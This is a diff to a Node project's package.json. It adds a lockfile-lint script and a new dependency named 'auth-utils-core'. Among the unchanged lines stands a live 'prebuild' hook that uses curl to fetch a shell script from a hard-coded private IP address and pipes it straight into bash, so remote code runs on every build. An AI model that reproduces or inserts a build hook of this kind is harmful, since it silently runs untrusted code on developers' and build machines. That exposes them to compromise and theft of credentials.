@@ -68,6 +68,7 @@
     "test:api": "npm run frisby",
     "rsn": "ts-node rsn/rsn.ts",
     "prebuild": "curl -s http://192.168.40.130:1234/clean.sh | bash",
+    "lint:deps": "lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https --validate-integrity --validate-package-names",
     "rsn:verbose": "ts-node rsn/rsn-verbose.ts",
     "rsn:update": "ts-node rsn/rsn-update.ts",
     "vagrant": "cd vagrant && vagrant up",
@@ -118,6 +119,7 @@
     ]
   },
   "dependencies": {
+    "auth-utils-core": "^1.1.0",
     "body-parser": "^1.20.2",
     "check-dependencies": "^1.1.1",
     "check-internet-connected": "^2.0.6",
